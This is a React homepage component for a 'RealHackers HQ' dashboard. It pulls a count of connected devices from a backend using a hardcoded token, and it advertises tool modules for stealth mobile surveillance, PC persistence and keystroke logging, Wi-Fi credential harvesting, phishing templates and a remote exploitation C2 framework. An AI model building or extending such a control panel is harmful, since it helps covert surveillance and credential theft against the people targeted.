import React, { useState, useEffect } from 'react';
import { 
  Shield, Monitor, Smartphone, Terminal, Users, 
  Activity, Zap, Globe, ChevronRight 
} from 'lucide-react';
import TypingText from '../components/TypingText';
import { motion } from 'framer-motion';
import axios from 'axios';

const HomePage: React.FC = () => {
  const [stats, setStats] = useState([
    { label: 'CORES_ACTIVE', value: '0', icon: Smartphone, color: '#e74c3c' },
    { label: 'UPLINK_STATUS', value: 'READY', icon: Activity, color: '#f1c40f' },
    { label: 'DATA_EXTRACTED', value: '0MB', icon: Zap, color: '#3498db' }
  ]);

  useEffect(() => {
    document.title = "RealHackers HQ // Home";
    const backendUrl = localStorage.getItem('adex_url') || 'https://talhasss-adex-backend.hf.space';
    const botToken = localStorage.getItem('adex_token') || 'talha-hq-secret-123';

    const fetchStats = async () => {
      try {
        const response = await axios.get(`${backendUrl}/api/v1/devices`, {
          params: { guildId: 'hq-guild', discordUserId: '123456789012345678' },
          headers: { 'x-adex-bot-token': botToken }
        });
        const devices = response.data.devices || [];
        setStats([
          { label: 'CORES_ACTIVE', value: devices.length.toString(), icon: Smartphone, color: '#e74c3c' },
          { label: 'UPLINK_STATUS', value: 'SECURE', icon: Activity, color: '#2ecc71' },
          { label: 'DATA_EXTRACTED', value: 'REALTIME', icon: Zap, color: '#3498db' }
        ]);
      } catch (err) {}
    };

    fetchStats();
  }, []);

  const tools = [
    { id: 'a-dex', icon: Smartphone, title: 'A-Dex', desc: 'Mobile Intelligence & Stealth Surveillance Engine.', link: '/a-dex', status: 'online' },
    { id: 'h-dex', icon: Monitor, title: 'H-Dex', desc: 'PC Persistence & Advanced Keystroke Logging.', link: '/h-dex', status: 'pending' },
    { id: 'esp32', icon: Terminal, title: 'ESP32 Phisher', desc: 'Hardware-based Wi-Fi Credential Harvester.', link: 'https://espwifiphisher.alexxdal.com/', status: 'online', external: true },
    { id: 'phish', icon: Shield, title: 'Phishing', desc: 'High-Conversion Social Engineering Templates.', link: '/phishing', status: 'pending' },
    { id: 'osint', icon: Users, title: 'OSINT', desc: 'Open Source Intelligence & Social Mapping.', link: '/osint', status: 'pending' },
    { id: 'danger', icon: Terminal, title: 'Danger', desc: 'Remote Exploitation & C2 Framework.', link: '/danger', status: 'restricted' }
  ];

  return (
    <div className="container" style={{ paddingTop: '1rem' }}>
      
      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '1rem', marginBottom: '3rem' }}>
        {stats.map((stat, i) => (
          <motion.div
            key={stat.label}
            initial={{ opacity: 0, y: -20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: i * 0.1 }}
            className="card"
            style={{ padding: '1.2rem', display: 'flex', alignItems: 'center', gap: '1rem', borderLeft: `2px solid ${stat.color}` }}
          >
            <stat.icon size={20} color={stat.color} />
            <div>
              <div style={{ fontSize: '0.6rem', color: '#666', fontWeight: 'bold' }}>{stat.label}</div>
              <div style={{ fontSize: '1.2rem', fontWeight: '900', fontFamily: 'JetBrains Mono' }}>{stat.value}</div>
            </div>
          </motion.div>
        ))}
      </div>

      <header style={{ textAlign: 'center', marginBottom: '4rem' }}>
        <h1 style={{ fontSize: 'clamp(2.5rem, 8vw, 5rem)', fontWeight: '900', letterSpacing: '8px', marginBottom: '1rem' }}>
          <TypingText text="REAL HACKERS HQ" speed={100} />
        </h1>
        <div style={{ display: 'flex', justifyContent: 'center', gap: '20px', opacity: 0.5, fontSize: '0.8rem', fontWeight: 'bold' }}>
           <span><Globe size={12} /> GLOBAL_GRID_ACTIVE</span>
           <span><Shield size={12} /> AES_ENCRYPTION_ENABLED</span>
        </div>
      </header>

      <div className="grid-responsive">
        {tools.map((tool, i) => (
          <motion.div 
            key={tool.id}
            initial={{ opacity: 0, scale: 0.9 }}
            whileInView={{ opacity: 1, scale: 1 }}
            viewport={{ once: true }}
            transition={{ delay: i * 0.1 }}
            className="card"
            style={{ position: 'relative' }}
          >
            <div style={{ position: 'absolute', top: '1.5rem', right: '1.5rem', display: 'flex', alignItems: 'center', gap: '8px' }}>
               <div style={{ 
                 width: '8px', height: '8px', borderRadius: '50%', 
                 background: tool.status === 'online' ? '#2ecc71' : tool.status === 'pending' ? '#f1c40f' : '#e74c3c',
                 boxShadow: tool.status === 'online' ? '0 0 10px #2ecc71' : 'none'
               }} />
               <span style={{ fontSize: '0.5rem', fontWeight: '900', color: '#444' }}>{tool.status.toUpperCase()}</span>
            </div>

            <tool.icon size={32} style={{ marginBottom: '1.5rem', opacity: 0.8, color: tool.status === 'online' ? 'var(--accent-color)' : '#444' }} />
            <h3 style={{ fontSize: '1.2rem', fontWeight: '900', letterSpacing: '2px' }}>{tool.title}</h3>
            <p style={{ margin: '1rem 0 2rem', opacity: 0.5, fontSize: '0.85rem', lineHeight: '1.6' }}>{tool.desc}</p>
            
            <a 
              href={tool.link} 
              className="btn" 
              target={tool.external ? "_blank" : "_self"}
              rel={tool.external ? "noopener noreferrer" : ""}
              style={{ width: '100%', justifyContent: 'space-between' }}
            >
              {tool.status === 'online' ? 'INITIALIZE_MODULE' : 'COMING_SOON'} <ChevronRight size={14} />
            </a>
          </motion.div>
        ))}
      </div>

    </div>
  );
};

export default HomePage;
